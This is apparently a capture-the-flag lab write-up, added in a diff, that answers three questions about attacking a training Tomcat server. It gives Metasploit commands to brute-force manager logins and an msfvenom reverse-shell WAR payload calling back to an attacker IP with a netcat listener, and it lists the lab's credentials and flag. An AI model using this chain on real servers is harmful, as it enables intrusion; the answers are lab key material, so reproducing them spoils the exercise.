@@ -1,1 +1,27 @@
 
+
+
+Question 1 -  Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username? - tomcat 
+1)
+msfconsole -q
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS 10.129.201.58
+set RPORT 8180
+set VHOST web01.inlanefreight.local
+set STOP_ON_SUCCESS true
+exploit
+output -> tomcat:root
+
+
+Question 2 - What is password to user found above?  = root
+1) steps above
+
+
+Question 3 - Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt
+1) msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.252 LPORT=4444 -f war -o backup.war
+2) go to -> http://web01.inlanefreight.local/manager/html -> login with creds from 1 & 2 
+3) nc -nlvp 4444 
+4) browse for war file -> deploy -> hit /backup to catch shell 
+5) cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
+
+t0mcat_rc3_ftw! 
